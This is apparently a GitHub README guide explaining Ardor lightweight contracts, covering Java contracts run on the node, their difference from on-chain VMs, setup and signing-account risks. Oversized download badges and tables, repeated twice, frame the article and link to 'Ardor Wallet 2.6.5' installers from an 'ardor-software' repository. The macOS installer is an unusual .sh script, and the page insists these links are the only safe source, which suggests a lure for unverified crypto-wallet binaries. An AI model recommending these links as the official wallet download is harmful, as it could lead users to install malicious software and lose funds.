![Ardor Wallet guide](assets/banner-article.png)

# Ardor lightweight contracts explained

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A lightweight contract is a small program that reacts to transactions and runs on the node, written in Java and registered with the node rather than deployed to the chain. It is a different model from a general-purpose virtual machine: the logic runs off chain, the transactions it produces are on chain.

## What a lightweight contract is

The contract is a class that the [Ardor node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) loads. When a transaction arrives that matches its trigger, the node runs the code, and the code can prepare a follow-up transaction signed with the account the contract is configured to use.

That design keeps the [Ardor chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) simple. The chain does not execute arbitrary code and does not carry the cost of doing so for every node; it records the transactions the contract decides to submit, which are ordinary transactions with ordinary fees and no special status on chain.

## How it differs from a virtual machine

| | Lightweight contracts | General-purpose VM |
|---|---|---|
| Where code runs | On the node, off chain | On chain, by every node |
| Language | Java | The VM's own language |
| Cost model | The node's own resources | Gas paid by the caller |
| Deployment | Registered with the node | Deployed as bytecode |
| Determinism requirement | The node trusts itself | Every node must agree |

The last row is the important difference. On-chain code must be deterministic because every node must reach the same result. Off-chain code has no such requirement, which is why it can call libraries, read files and take its time - and why its behaviour depends on the machine it runs on.

## How a contract is set up

1. Write the contract as a [Java](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/fix-ardor-wallet-java-error.md) class that implements the expected interface.
2. Compile it against the node's library.
3. Place the compiled class where the node looks for contract code.
4. Configure the contract's properties: the trigger, the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) it signs with and any parameters.
5. Restart the node and confirm the contract loaded without errors.
6. Test on a private chain before letting it touch a funded account.

Step six is not optional. A contract that signs with a funded account is an automated spender, and its mistakes are transactions that cannot be reversed.

## What they are good for

The pattern suits automation that one operator runs for their own account: a service that pays out on a schedule, a bot that reacts to a particular transaction type, an integration that watches the chain and submits a follow-up. In each case the operator already trusts the machine.

It suits those because the operator is also the person running the node. The trust model is that you trust your own machine, which is a very different proposition from trusting code that a stranger deployed.

## Limits worth understanding

A lightweight contract is not trustless in the way on-chain code is. Its behaviour depends on the node running it, and a different node could run different code against the same account.

That makes it unsuitable for anything a third party needs to verify independently. If the point is that somebody else can check the rules were followed, the rules have to be on chain, and that is a different tool.

Being clear about that prevents a common disappointment. A team builds an automated payout as a contract on their node, then discovers that nobody outside can audit what it did without trusting the team's own logs. The automation works; the verifiability does not travel with it.

## A worked example

A shop accepts a child chain token and wants to send a receipt record when a payment arrives. The trigger is a transaction to the shop's account, the contract reads the amount, and it submits a data cloud record referencing the order.

Nothing in that flow needs on-chain code. The chain records the payment and the receipt; the logic that connects them runs on the shop's own node. If the contract has a bug, the shop fixes it and restarts, which is not an option for bytecode already deployed to a chain.

## What to read before installing one

Read the class, not the description. Look for what it signs with, what it will send, and whether it can be triggered by anybody who can reach the node. A contract that reacts to an unsigned trigger and signs with a funded account is an open door.

Then check where it writes: a file path, a database or a log. A contract with file access can do things a chain contract never could, which is the feature and the risk in the same sentence.

## Security and the signing account

The account a contract signs with is the account whose funds it can move. Treat that account as you would treat a hot wallet: keep only what the automation needs, and keep the rest elsewhere.

Run contracts you wrote or have read. A contract is code with signing authority, and installing one from an unknown source is the same decision as handing over a key, with extra steps. There is no sandbox between a loaded contract and the account it signs with.

## FAQ

### Are lightweight contracts on chain?

The code is not. It runs on the node; the transactions it submits are ordinary on-chain transactions.

### Can anyone use my contract?

It runs on your node and signs with your configured account, so its effects are yours. Others can trigger it only if you expose the relevant endpoints.

### Do they cost fees?

The transactions they submit pay normal fees. Running the code itself costs the node's resources rather than a gas fee, so a busy contract is paid for in electricity and disk rather than in a currency.

### Do I need to be a Java developer?

To write one, yes. To run one somebody else wrote, you need to be able to read it well enough to trust it with an account.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Ardor API and command line tools](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-api-and-command-line-tools.md)
- [Run an Ardor node from source](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/run-an-ardor-node-from-source.md)
- [Store data on the Ardor data cloud](https://github.com/ardor-software/ardor-platform-guides/blob/main/keep-files-on-the-ardor-data-cloud.md)
- [Phased, atomic and multisig transactions in Ardor](https://github.com/ardor-software/ardor-platform-guides/blob/main/phased-and-atomic-transactions-in-ardor.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
